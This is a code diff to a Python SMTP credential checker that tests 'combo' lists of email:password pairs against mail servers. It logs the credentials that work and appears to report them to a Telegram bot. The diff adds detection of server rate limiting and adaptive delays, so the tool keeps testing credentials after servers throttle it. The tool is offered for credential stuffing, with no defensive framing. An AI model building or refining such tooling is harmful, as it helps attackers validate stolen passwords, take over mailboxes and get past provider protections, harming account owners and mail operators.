@@ -36,6 +36,8 @@ CONFIG = {
     'delay_range': (0.1, 0.3),  # Reduced from (1,5)s for much faster processing
     'max_retries': 3,  # New: retry failed connections
     'retry_delay': 1.0,  # New: delay between retries
+    'rate_limit_detection': True,  # New: adaptive delays for rate limiting
+    'adaptive_delay_factor': 2.0,  # New: multiplier for adaptive delays
     'test_email_recipient': '',  # Set this to your test email
     'telegram_bot_token': '',  # Set your Telegram bot token
     'telegram_chat_id': '',  # Set your Telegram chat ID
@@ -80,6 +82,8 @@ class SMTPChecker:
             'total_tested': 0,
             'start_time': time.time()
         }
+        self.rate_limit_detected = False
+        self.adaptive_delay_multiplier = 1.0
         
     def parse_combo_line(self, line: str) -> Optional[Tuple[str, str]]:
         """Parse a combo line supporting multiple separators"""
@@ -139,9 +143,18 @@ class SMTPChecker:
             
         except (smtplib.SMTPServerDisconnected, smtplib.SMTPConnectError, OSError, ConnectionError) as e:
             # Connection errors may be transient - retry if attempts remain
+            error_str = str(e).lower()
+            
+            # Detect potential rate limiting
+            if CONFIG['rate_limit_detection'] and ('rate' in error_str or 'limit' in error_str or 'too many' in error_str):
+                self.rate_limit_detected = True
+                self.adaptive_delay_multiplier *= CONFIG['adaptive_delay_factor']
+                self.logger.warning(f"{Colors.MAGENTA}[RATE_LIMIT_DETECTED]{Colors.END} {email} - Adapting delays (x{self.adaptive_delay_multiplier:.1f})")
+            
             if retry_count < CONFIG['max_retries']:
-                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - Connection error, retrying... ({retry_count + 1}/{CONFIG['max_retries']})")
-                time.sleep(CONFIG['retry_delay'] * (2 ** retry_count))  # Exponential backoff
+                retry_delay = CONFIG['retry_delay'] * (2 ** retry_count) * self.adaptive_delay_multiplier
+                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - Connection error, retrying in {retry_delay:.1f}s... ({retry_count + 1}/{CONFIG['max_retries']})")
+                time.sleep(retry_delay)
                 return self.test_smtp_credentials(email, password, retry_count + 1)
             else:
                 result['error'] = f'Connection failed after {CONFIG["max_retries"]} retries: {str(e)}'
@@ -270,12 +283,17 @@ class SMTPChecker:
                 f.write(f"{result['email']}:{result['password']} - {result['error']}\n")
     
     def process_combo(self, combo_data: Tuple[str, str]) -> Dict:
-        """Process a single combo with optimized delay"""
+        """Process a single combo with adaptive delay"""
         email, password = combo_data
         
-        # Minimal delay to avoid overwhelming the server while maintaining speed
-        delay = random.uniform(*CONFIG['delay_range'])
-        time.sleep(delay)
+        # Apply adaptive delay if rate limiting detected
+        base_delay = random.uniform(*CONFIG['delay_range'])
+        adaptive_delay = base_delay * self.adaptive_delay_multiplier
+        
+        if self.rate_limit_detected and adaptive_delay > base_delay:
+            self.logger.debug(f"{Colors.CYAN}[ADAPTIVE_DELAY]{Colors.END} {email} - Using {adaptive_delay:.2f}s delay")
+        
+        time.sleep(adaptive_delay)
         
         # Test the credentials with retry logic
         result = self.test_smtp_credentials(email, password)
@@ -390,6 +408,9 @@ class SMTPChecker:
         if hasattr(self.results, 'retries') and self.results.get('retries', 0) > 0:
             print(f"{Colors.MAGENTA}🔄 Total Retries: {Colors.BOLD}{self.results.get('retries', 0)}{Colors.END}")
         
+        if self.rate_limit_detected:
+            print(f"{Colors.MAGENTA}⚠️  Rate Limiting Detected: {Colors.BOLD}Yes (adaptive delays active){Colors.END}")
+        
         if hasattr(self.results, 'connection_errors'):
             print(f"{Colors.YELLOW}🔌 Connection Errors: {Colors.BOLD}{self.results.get('connection_errors', 0)}{Colors.END}")
         
@@ -452,7 +473,9 @@ def create_sample_config():
         "delay_range": [0.1, 0.3],
         "smtp_timeout": 5,
         "max_retries": 3,
-        "retry_delay": 1.0
+        "retry_delay": 1.0,
+        "rate_limit_detection": True,
+        "adaptive_delay_factor": 2.0
     }
     
     with open('config.json.example', 'w', encoding='utf-8') as f:
